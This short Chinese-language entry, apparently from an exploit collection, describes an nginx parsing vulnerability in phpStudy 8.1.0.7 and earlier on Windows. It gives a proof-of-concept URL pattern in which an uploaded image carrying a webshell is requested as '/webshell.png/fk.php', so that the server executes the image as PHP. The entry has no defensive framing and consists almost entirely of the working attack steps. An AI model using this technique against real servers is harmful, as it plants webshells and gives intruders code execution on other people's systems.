# phpstudy nginx 解析漏洞

影响版本：
```
phpStudy <=8.1.0.7 Windows版本
```


poc
```
http://www.xxx.com/webshell.png/fk.php (任何服务器端不存在的php文件均可,比如fk.php)

上传图片马，然后使用poc进行解析：
/webshell.png/fk.php
即可把webshell.png当php来解析
```